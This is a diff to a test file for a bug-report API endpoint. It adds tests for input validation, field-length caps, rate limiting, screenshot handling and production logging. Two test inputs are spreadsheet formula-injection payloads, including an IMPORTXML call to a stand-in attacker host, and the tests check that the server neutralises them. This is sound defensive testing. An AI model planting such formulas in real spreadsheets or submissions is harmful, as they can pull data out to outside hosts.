@@ -6,7 +6,7 @@
  * broken/expired session must still save - so the "no session" case
  * below is a real, in-scope path, not just an auth-guard smoke test.
  */
-import { describe, it, expect, beforeEach, afterEach } from "vitest";
+import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
 import request from "supertest";
 import fs from "fs/promises";
 import path from "path";
@@ -15,6 +15,7 @@ import { app } from "../app";
 import { server } from "./setup";
 import { resetHandlersState, appendCallCount, lastAppendedRow } from "./handlers";
 import { authCookieHeader } from "./helpers/session";
+import { _resetBugReportRateLimitForTesting } from "../routes/bugReportRoutes";
 
 const mockTokens = {
   access_token: "bug-report-mock-token",
@@ -48,6 +49,7 @@ async function listBugReportFiles(): Promise<string[]> {
 describe("POST /api/bug-reports", () => {
   beforeEach(() => {
     resetHandlersState();
+    _resetBugReportRateLimitForTesting();
   });
 
   afterEach(async () => {
@@ -135,6 +137,72 @@ describe("POST /api/bug-reports", () => {
     expect(res.body).toMatchObject({ success: true, storage: "local" });
     expect(appendCallCount).toBe(0);
     expect(await listBugReportFiles()).toHaveLength(1);
+  });
+
+  it("400s on a type outside the three the dialog offers", async () => {
+    const res = await request(app).post("/api/bug-reports").set(authHeader).send({ ...validBody, type: "=HYPERLINK(\"x\")" });
+    expect(res.status).toBe(400);
+    expect(res.body.error).toContain("type must be one of");
+  });
+
+  it("writes the timestamp and Report ID columns as validated values, never as sent - they skipped the formula guard (ROADMAP.md M1)", async () => {
+    const res = await request(app)
+      .post("/api/bug-reports")
+      .set(authHeader)
+      .send({ ...validBody, timestamp: '=IMPORTXML("https://attacker.example/x","//x")', bugReportsSpreadsheetId: "sheet-abc" });
+
+    expect(res.status).toBe(200);
+    expect(lastAppendedRow[1]).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z$/);
+    expect(lastAppendedRow[0]).toMatch(/^\d{4}-\d{2}-\d{2}T[\w-]+$/);
+  });
+
+  it("caps each free-text field so one request can't write megabytes of text", async () => {
+    const res = await request(app).post("/api/bug-reports").set(authHeader).send({ ...validBody, description: "x".repeat(200_000), bugReportsSpreadsheetId: "sheet-abc" });
+    expect(res.status).toBe(200);
+    expect(lastAppendedRow[5]).toHaveLength(50_000);
+  });
+
+  it("rate-limits reports without a session per address, so an anonymous script can't flood the logs or disk", async () => {
+    for (let i = 0; i < 5; i++) {
+      const ok = await request(app).post("/api/bug-reports").send(validBody);
+      expect(ok.status).toBe(200);
+    }
+    const limited = await request(app).post("/api/bug-reports").send(validBody);
+    expect(limited.status).toBe(429);
+
+    // A signed-in user is not limited.
+    const signedIn = await request(app).post("/api/bug-reports").set(authHeader).send(validBody);
+    expect(signedIn.status).toBe(200);
+  });
+
+  it("drops the screenshot from a report without a session", async () => {
+    const res = await request(app).post("/api/bug-reports").send({ ...validBody, screenshotBase64: "aGVsbG8=" });
+    expect(res.status).toBe(200);
+    const files = await listBugReportFiles();
+    expect(files.filter((f) => f.endsWith(".png"))).toHaveLength(0);
+    expect(files.filter((f) => f.endsWith(".md"))).toHaveLength(1);
+  });
+
+  it("in production, falls back to one structured Cloud Logging entry instead of Cloud Run's in-memory disk", async () => {
+    const previous = process.env.NODE_ENV;
+    process.env.NODE_ENV = "production";
+    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+    try {
+      const res = await request(app).post("/api/bug-reports").set(authHeader).send({ ...validBody, screenshotBase64: "aGVsbG8=" });
+      expect(res.status).toBe(200);
+      expect(res.body).toMatchObject({ success: true, storage: "log" });
+      expect(await listBugReportFiles()).toHaveLength(0);
+
+      const entry = errorSpy.mock.calls.map((c) => c[0]).find((c) => typeof c === "string" && c.includes('"bugReport"'));
+      const parsed = JSON.parse(entry as string);
+      expect(parsed.severity).toBe("ERROR");
+      expect(parsed.bugReport.title).toBe("Checkout button does nothing");
+      expect(parsed.bugReport.screenshotOmitted).toBe(true);
+      expect(parsed.bugReport).not.toHaveProperty("screenshotBase64");
+    } finally {
+      process.env.NODE_ENV = previous;
+      errorSpy.mockRestore();
+    }
   });
 
   it("accepts a realistic base64 screenshot payload - the default express.json() 100kb limit used to reject this with a 413, hit for real by an actual submitted bug report", async () => {
